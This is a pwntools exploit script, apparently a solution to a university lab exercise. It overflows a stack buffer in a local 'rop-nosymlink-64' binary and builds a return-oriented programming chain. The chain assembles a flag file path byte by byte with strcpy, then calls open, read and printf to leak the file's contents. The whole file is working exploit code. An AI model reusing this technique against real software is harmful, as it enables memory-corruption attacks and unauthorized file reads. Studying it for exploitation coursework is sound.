#!/usr/bin/env python

from pwn import *

p = process("./rop-nosymlink-64")

strcpy = p.elf.symbols['strcpy']
_open = p.elf.symbols['open']
read = p.elf.symbols['read']
printf = p.elf.symbols['printf']

alphabet = 'the quick brown fox jumps over the lazy dog!'
numbers = 'I also put this for you: 1234567890-'

def get_alphabet_address(ch):
    idx = alphabet.find(ch)
    return 0x400890 + idx

def get_numbers(ch):
    idx = numbers.find(ch)
    return 0x4008c0 + idx

slash = 0x400398

target_path = '/home/blue9057/dev/cs519-fall2018/lab/week6/rop-nosymlink/flag-64'


payload = "A" * (0x80 + 8)

addr_buffer = 0x601050
#0x0000000000400863 : pop rdi ; ret
#0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
#0x0000000000400861 : pop rsi ; pop r15 ; ret

rdi_ret = 0x400863
rdx_rbp_ret = 0x40073f
rsi_r15_ret = 0x400861

idx = 0
for c in target_path:
    payload += p64(rdi_ret) + p64(addr_buffer + idx)
    if c == '/':
        payload += p64(rsi_r15_ret) + p64(slash) + p64(slash)
    elif c in '1234567890-':
        payload += p64(rsi_r15_ret) + p64(get_numbers(c)) + p64(0)
    else:
        payload += p64(rsi_r15_ret) + p64(get_alphabet_address(c)) + p64(0)
    payload += p64(strcpy)
    idx += 1

payload += p64(rdi_ret) + p64(addr_buffer + len(target_path)) + \
           p64(rsi_r15_ret) + p64(slash+1) + p64(0) + p64(strcpy)


payload += p64(rdi_ret) + p64(addr_buffer)
payload += p64(rsi_r15_ret) + p64(0) + p64(0)
payload += p64(_open)

payload += p64(rdi_ret) + p64(3)
payload += p64(rsi_r15_ret) + p64(addr_buffer) + p64(addr_buffer)
payload += p64(rdx_rbp_ret) + p64(100) + p64(100)
payload += p64(read)

payload += p64(rdi_ret) + p64(addr_buffer)
payload += p64(printf)

print(repr(payload))
print(len(payload))

with open('exploit.txt','wb') as f:
    f.write(payload)

p.sendline(payload)

p.interactive()
